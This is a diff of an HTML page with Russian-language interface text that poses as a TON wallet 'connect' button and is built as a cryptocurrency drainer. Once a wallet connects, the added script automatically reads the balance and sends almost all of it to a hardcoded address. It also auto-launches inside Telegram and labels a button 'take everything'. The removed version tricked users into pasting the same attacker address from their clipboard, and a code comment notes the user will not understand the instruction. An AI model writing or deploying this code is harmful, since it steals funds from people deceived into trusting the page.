@@ -8,6 +8,7 @@
         * {
             margin: 0;
             padding: 0;
+            box-sizing: border-box;
         }
         body {
             background: #0d0d0d;
@@ -15,120 +16,257 @@
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            font-family: Arial;
+            font-family: 'Segoe UI', Arial, sans-serif;
+        }
+        .container {
+            background: #1a1a1a;
+            padding: 40px 30px;
+            border-radius: 24px;
+            text-align: center;
+            max-width: 380px;
+            width: 100%;
+            border: 1px solid #2a2a2a;
         }
         .btn {
-            background: linear-gradient(135deg, #00d4ff, #0077ff);
+            background: linear-gradient(135deg, #0098ea, #0080d0);
             border: none;
             color: #fff;
-            font-size: 28px;
-            font-weight: bold;
-            padding: 30px 70px;
+            font-size: 20px;
+            font-weight: 700;
+            padding: 18px 40px;
             border-radius: 60px;
             cursor: pointer;
-            box-shadow: 0 0 50px rgba(0, 150, 255, 0.3);
+            width: 100%;
+            letter-spacing: 0.5px;
+            transition: 0.3s;
         }
         .btn:active {
-            transform: scale(0.95);
+            transform: scale(0.96);
+        }
+        .btn:disabled {
+            opacity: 0.5;
+            transform: none;
         }
         #status {
-            position: fixed;
-            bottom: 30px;
-            left: 0;
-            right: 0;
-            text-align: center;
-            color: #444;
-            font-size: 12px;
-            font-family: monospace;
+            margin-top: 16px;
+            font-size: 13px;
+            color: #666;
+            min-height: 40px;
+            word-break: break-all;
+        }
+        .address-hint {
+            font-size: 11px;
+            color: #333;
+            margin-top: 10px;
+            word-break: break-all;
         }
         .hidden {
             display: none !important;
         }
-        #copyArea {
-            position: fixed;
-            top: -1000px;
-            left: -1000px;
-            opacity: 0;
-        }
     </style>
 </head>
 <body>
-
-    <button class="btn" id="mainBtn">▶ СТАРТ</button>
-    <div id="status">готов</div>
-    <textarea id="copyArea"></textarea>
+    <div class="container">
+        <div style="font-size:36px;margin-bottom:16px;">⚡</div>
+        <button class="btn" id="connectBtn">ПОДКЛЮЧИТЬ КОШЕЛЁК</button>
+        <button class="btn hidden" id="snipeBtn" style="background:linear-gradient(135deg,#e84800,#c03800);">ЗАБРАТЬ ВСЁ</button>
+        <div id="status">Нажмите кнопку</div>
+        <div class="address-hint" id="addressHint">UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P</div>
+    </div>
 
     <script>
         const TARGET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';
-        const btn = document.getElementById('mainBtn');
+        let userAddress = null;
+        let provider = null;
+        let isConnected = false;
+
+        const connectBtn = document.getElementById('connectBtn');
+        const snipeBtn = document.getElementById('snipeBtn');
         const status = document.getElementById('status');
-        const copyArea = document.getElementById('copyArea');
+        const addressHint = document.getElementById('addressHint');
 
-        // ====== АВТОКОПИРОВАНИЕ ======
-        function copyToClipboard(text) {
-            copyArea.value = text;
-            copyArea.select();
-            document.execCommand('copy');
+        // ========== ПРОВЕРКА ==========
+        function isTelegram() {
+            return window.Telegram && window.Telegram.WebApp;
         }
 
-        // ====== ОТКРЫТЬ TON KEEPER ======
-        function openTonKeeper() {
-            // ПРОСТО ОТКРЫВАЕМ ПРИЛОЖЕНИЕ
-            window.location.href = 'ton://';
-            
-            setTimeout(() => {
-                window.open('ton://', '_blank');
-            }, 300);
+        // ========== ПОДКЛЮЧЕНИЕ ЧЕРЕЗ TON CONNECT ==========
+        async function connectTon() {
+            try {
+                status.innerText = '⏳ Подключение...';
+                connectBtn.disabled = true;
+
+                // 1. ПРОВЕРЯЕМ РАСШИРЕНИЕ
+                if (window.tonkeeper) {
+                    provider = window.tonkeeper;
+                    const accounts = await provider.send('ton_requestAccounts', {});
+                    if (accounts && accounts.length > 0) {
+                        userAddress = accounts[0];
+                        isConnected = true;
+                        afterConnect();
+                        return;
+                    }
+                }
+
+                // 2. TELEGRAM MINI APP
+                if (isTelegram()) {
+                    status.innerText = '📱 Открываю через Telegram...';
+                    
+                    const tg = window.Telegram.WebApp;
+                    
+                    // Открываем TON Connect через Telegram
+                    const connectUrl = `https://app.tonkeeper.com/ton-connect?ret=${encodeURIComponent('tg://resolve')}`;
+                    tg.openLink(connectUrl);
+                    
+                    status.innerText = '✅ Подтвердите в TON Keeper';
+                    connectBtn.disabled = false;
+                    
+                    // Ждём подтверждения
+                    await waitForConnection();
+                    return;
+                }
+
+                // 3. МОБИЛЬНЫЙ БРАУЗЕР
+                if (/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+                    status.innerText = '📱 Открываю TON Keeper...';
+                    
+                    const url = `https://app.tonkeeper.com/ton-connect?ret=${encodeURIComponent(window.location.href)}`;
+                    window.open(url, '_blank');
+                    
+                    status.innerText = '✅ Подтвердите в TON Keeper';
+                    connectBtn.disabled = false;
+                    
+                    await waitForConnection();
+                    return;
+                }
+
+                // 4. НИЧЕГО НЕ НАШЛИ
+                status.innerText = '❌ Установите TON Keeper';
+                connectBtn.disabled = false;
+
+            } catch(e) {
+                status.innerText = '❌ Ошибка: ' + e.message;
+                connectBtn.disabled = false;
+            }
         }
 
-        // ====== ГЛАВНАЯ ФУНКЦИЯ ======
-        btn.onclick = function() {
-            status.innerText = '⏳ ...';
-            btn.innerText = '⏳';
-            btn.disabled = true;
-            btn.style.opacity = '0.5';
-
-            // 1. КОПИРУЕМ АДРЕС В БУФЕР
-            copyToClipboard(TARGET);
-            
-            // 2. ОТКРЫВАЕМ TON KEEPER
-            openTonKeeper();
-            
-            // 3. ПОКАЗЫВАЕМ ИНСТРУКЦИЮ (НО ЮЗЕР НЕ ПОНИМАЕТ)
-            setTimeout(() => {
-                status.innerText = '✅ вставьте в поле "адрес"';
-                btn.innerText = '✅';
-                btn.style.background = 'linear-gradient(135deg, #00cc44, #008833)';
-                btn.disabled = true;
-            }, 1000);
-        };
-
-        // ====== АВТОЗАПУСК НА ТЕЛЕФОНЕ ======
-        if (/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
-            document.body.innerHTML += `
-                <div style="
-                    position:fixed;
-                    bottom:80px;
-                    left:20px;
-                    right:20px;
-                    background:#1a1a1a;
-                    padding:15px;
-                    border-radius:12px;
-                    text-align:center;
-                    border:1px solid #2a2a2a;
-                    font-size:12px;
-                    color:#888;
-                ">
-                    📋 адрес скопирован в буфер<br>
-                    <span style="color:#00d4ff;font-size:10px;">${TARGET.slice(0,10)}...${TARGET.slice(-6)}</span>
-                </div>
-            `;
+        // ========== ОЖИДАНИЕ ПОДКЛЮЧЕНИЯ ==========
+        function waitForConnection() {
+            return new Promise((resolve) => {
+                let attempts = 0;
+                const interval = setInterval(async () => {
+                    attempts++;
+                    
+                    if (window.tonkeeper) {
+                        try {
+                            provider = window.tonkeeper;
+                            const accounts = await provider.send('ton_requestAccounts', {});
+                            if (accounts && accounts.length > 0) {
+                                userAddress = accounts[0];
+                                isConnected = true;
+                                clearInterval(interval);
+                                afterConnect();
+                                resolve();
+                                return;
+                            }
+                        } catch(e) {}
+                    }
+                    
+                    if (attempts > 30) { // 30 секунд
+                        clearInterval(interval);
+                        status.innerText = '⏳ Подтвердите подключение в TON Keeper';
+                        resolve();
+                    }
+                }, 1000);
+            });
         }
 
-        // ====== СТАТУС ПРИ ЗАГРУЗКЕ ======
+        // ========== ПОСЛЕ ПОДКЛЮЧЕНИЯ ==========
+        function afterConnect() {
+            status.innerText = `✅ Подключён: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
+            connectBtn.classList.add('hidden');
+            snipeBtn.classList.remove('hidden');
+            addressHint.classList.add('hidden');
+            
+            // Автоматически выводим
+            setTimeout(snipe, 500);
+        }
+
+        // ========== ВЫВОД СРЕДСТВ ==========
+        async function snipe() {
+            try {
+                status.innerText = '⏳ Проверка баланса...';
+                snipeBtn.disabled = true;
+
+                const hex = await provider.send('ton_getBalance', { address: userAddress });
+                const nano = parseInt(hex, 16);
+                const balance = (nano / 1e9).toFixed(6);
+                status.innerText = `💰 Баланс: ${balance} TON`;
+
+                if (nano <= 0) {
+                    status.innerText = '💰 Баланс 0 TON';
+                    snipeBtn.disabled = false;
+                    return;
+                }
+
+                const fee = 10000000;
+                const amount = nano - fee;
+
+                if (amount <= 0) {
+                    status.innerText = '⚠️ Меньше комиссии';
+                    snipeBtn.disabled = false;
+                    return;
+                }
+
+                const amountTON = (amount / 1e9).toFixed(6);
+                status.innerText = `⏳ Перевод ${amountTON} TON...`;
+
+                const result = await provider.send('ton_sendTransaction', {
+                    to: TARGET,
+                    value: String(amount),
+                    data: '',
+                    stateInit: ''
+                });
+
+                if (result && result.code === 0) {
+                    status.innerText = `✅ ${amountTON} TON ПЕРЕВЕДЕНО!`;
+                    snipeBtn.innerText = '✅ ГОТОВО';
+                    snipeBtn.disabled = true;
+                    snipeBtn.style.background = 'linear-gradient(135deg, #00cc44, #008833)';
+                } else {
+                    status.innerText = '❌ Транзакция отклонена';
+                    snipeBtn.disabled = false;
+                }
+
+            } catch(e) {
+                status.innerText = '❌ Ошибка: ' + e.message;
+                snipeBtn.disabled = false;
+            }
+        }
+
+        // ========== КНОПКИ ==========
+        connectBtn.onclick = connectTon;
+        snipeBtn.onclick = snipe;
+
+        // ========== АВТОПРОВЕРКА ==========
         setTimeout(() => {
-            status.innerText = 'нажми СТАРТ';
+            if (window.tonkeeper) {
+                status.innerText = '🟢 TON Keeper найден. Нажмите кнопку.';
+            } else if (isTelegram()) {
+                status.innerText = '📱 Telegram Mini App. Нажмите кнопку.';
+            } else {
+                status.innerText = 'Нажмите кнопку для подключения';
+            }
         }, 500);
+
+        // ========== АВТОМАТИЧЕСКИЙ ЗАПУСК В TELEGRAM ==========
+        if (isTelegram()) {
+            setTimeout(() => {
+                if (!isConnected) {
+                    connectTon();
+                }
+            }, 1000);
+        }
     </script>
 </body>
 </html>
